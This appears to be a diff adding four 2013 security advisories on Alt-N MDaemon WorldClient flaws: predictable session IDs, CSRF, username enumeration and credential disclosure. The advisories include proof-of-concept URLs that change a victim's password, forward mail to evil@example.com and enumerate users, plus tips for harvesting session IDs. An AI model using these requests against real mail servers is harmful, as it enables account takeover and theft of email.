@@ -1,0 +1,168 @@
+======================================================================
+   Alt-N MDaemon's WorldClient Predictable Session ID Vulnerability
+======================================================================
+
+Software:  Alt-N MDaemon v13.0.3 and prior versions
+Vendor: http://www.altn.com/
+Vuln Type: Session ID Prediction
+Remote: Yes
+Local: No
+Discovered by: QSecure and Demetris Papapetrou
+References: http://www.qsecure.com.cy/advisories/Alt-N_MDaemon_WorldClient_Predictable_Session_ID.html
+Discovered: 25/07/2012
+Reported: 19/12/2012
+Fixed: 15/01/2013 (http://files.altn.com/MDaemon/Release/RelNotes_en.html)
+Disclosed: 18/02/2013
+
+VULNERABILITY DESCRIPTION:
+==========================
+Alt-N WorldClient is the web interface of the MDaemon email server. It
+has been identified that application session state is not maintained
+by the user's session cookie but by the URL "Session" parameter
+instead. This parameter is transmitted with every user request sent to
+the WorldClient web application and under certain circumstances future
+session IDs can be successfully predicted.
+
+The use of predictable session IDs for authentication makes
+WorldClient prone to session hijacking attacks. If the attacker can
+generate a current valid session ID then he/she may be able to access
+webmail accounts without possessing a valid username/password. The
+impact of the attack is significantly reduced because WorldClient
+associates the client's IP address with each session ID produced.
+However, certain network setups or other scenarios may exist that
+could render the IP restriction ineffective.
+
+Alt-N MDaemon v13.0.3 & v12.5.6 were tested and found vulnerable;
+other versions may also be affected.
+
+Pre-Requisites:
+---------------
+1) The attacker needs to get a current or expired session ID.
+       a) Google Search: "WorldClient.dll?Session="
+       b) Steal an HTTP request and observe the Referer field
+2) The MDaemon service or the machine has not been restarted since the
+captured session ID was generated (There may be a way to deal with
+this but further research is needed).
+
+=====================================================================================
+   Alt-N MDaemon's WorldClient & WebAdmin Cross-Site Request Forgery
+Vulnerability
+=====================================================================================
+
+Software:  Alt-N MDaemon v13.0.3 and prior versions
+Vendor: http://www.altn.com/
+Vuln Type: Cross-Site Request Forgery
+Remote: Yes
+Local: No
+Discovered by: QSecure and Demetris Papapetrou
+References: http://www.qsecure.com.cy/advisories/Alt-N_MDaemon_WorldClient_and_WebAdmin_CSRF.html
+Discovered: 25/07/2012
+Reported: 19/12/2012
+Fixed: 15/01/2013 (http://files.altn.com/MDaemon/Release/RelNotes_en.html)
+Disclosed: 18/02/2013
+
+VULNERABILITY DESCRIPTION:
+==========================
+Alt-N WorldClient and WebAdmin applications are prone to a cross-site
+request-forgery vulnerability. It should be noted that partial
+protection is provided by the Session parameter, but this alone cannot
+be considered as an adequate protection mechanism.
+
+An attacker can exploit this issue to perform different actions on the
+affected application without the user's consent. For example, the
+attacker can change the user's password, forward a copy of the user's
+emails to a different email account, retrieve his/her address book,
+send email messages to other users/email addresses and/or perform
+other similar tasks.
+
+Alt-N MDaemon v13.0.3 & v12.5.6 were tested and found vulnerable;
+other versions may also be affected.
+
+PoC Exploit:
+============
+Change Password:
+http://www.example.com:3000/WorldClient.dll?Session=[SESSION_ID]&View=Options-Prefs&Reload=false&Save=Yes&ReturnJavaScript=Yes&ContentType=javascript&Password=Letme1n&ConfirmPassword=Letme1n
+
+Enable Forwarding:
+http://www.example.com:3000/WorldClient.dll?Session=[SESSION_ID]&View=Options-Prefs&Reload=false&Save=Yes&ReturnJavaScript=Yes&ContentType=javascript&ForwardingEnabled=Yes&ForwardingRetainCopy=Yes&ForwardingAddress=evil%40example.com
+
+====================================================================
+   Alt-N MDaemon's WorldClient Username Enumeration Vulnerability
+====================================================================
+
+Software:  Alt-N MDaemon v13.0.3 and prior versions
+Vendor: http://www.altn.com/
+Vuln Type: Username Enumeration
+Remote: Yes
+Local: No
+Discovered by: QSecure and Demetris Papapetrou
+References: http://www.qsecure.com.cy/advisories/Alt-N_MDaemon_WorldClient_Username_Enumeration.html
+Discovered: 14/09/2012
+Reported: 19/12/2012
+Fixed: 15/01/2013 (http://files.altn.com/MDaemon/Release/RelNotes_en.html)
+Disclosed: 18/02/2013
+
+VULNERABILITY DESCRIPTION:
+==========================
+Alt-N WorldClient is prone to a username-enumeration weakness by
+querying the user's Free-Busy schedule. The DTSTART and DTEND
+parameters in the returned FBData.vfb file, may indicate whether an
+email address/username is valid or not.
+
+Attackers may exploit this weakness to discern valid usernames. This
+may aid them in brute-force password cracking or other attacks.
+
+Alt-N MDaemon v13.0.3 & v12.5.6 were tested and found vulnerable;
+other versions may also be affected.
+
+PoC Exploit:
+============
+http://www.example.com:3000/WorldClient.dll?View=fbinfo&User=mickey.mouse@qsecure.com.cy
+
+For valid email accounts the DTSTART and DTEND values in the .vfb file
+start with a recent date backwards (e.g. 20120505) whereas for invalid
+ones the date is 19801231.
+
+==========================================================================================
+   Alt-N MDaemon's WorldClient Disclosure of Authentication
+Credentials Vulnerability
+==========================================================================================
+
+Software:  Alt-N MDaemon v13.0.3 and prior versions
+Vendor: http://www.altn.com/
+Vuln Type: Disclosure of Authentication Credentials
+Remote: Yes
+Local: No
+Discovered by: QSecure and Demetris Papapetrou
+References: http://www.qsecure.com.cy/advisories/Alt-N_MDaemon_WorldClient_Disclosure_of_Authentication_Credentials.html
+Discovered: 01/10/2012
+Reported: 19/12/2012
+Fixed: 15/01/2013 (http://files.altn.com/MDaemon/Release/RelNotes_en.html)
+Disclosed: 18/02/2013
+
+VULNERABILITY DESCRIPTION:
+==========================
+Alt-N WorldClient application is prone to an authentication
+credentials disclosure via a specially formulated HTTP request. This
+is possible because the application replies to the request with a
+response that contains the credentials in an encoded (reversible)
+format.
+
+Attackers may trick an unsuspecting user into opening a malicious
+email message -using the WorldClient application- and stealing his/her
+authentication credentials without the user ever noticing.
+
+Alt-N MDaemon v13.0.3 & v12.5.6 were tested and found vulnerable;
+other versions may also be affected.
+
+PoC Exploit:
+============
+Vulnerable URL:
+http://www.example.com:3000/WorldClient.dll?Session=[SESSION_ID]&View=WebAdmin
+
+Encoded Auth String:
+GaDAQBQOP3cymUmJxiNVaz80JTAklc/c+q7fAhmklkQSdp0XMo2X/4aVhqMtLz4OLuCf6v2T0Gc9KKHkvn
+ok0B9ARyso9/k
+
+Decoded Auth String:
+User=test%40ac1dc0de.com&Password=111111Ab&TimeStamp=1344532850&Lang=en
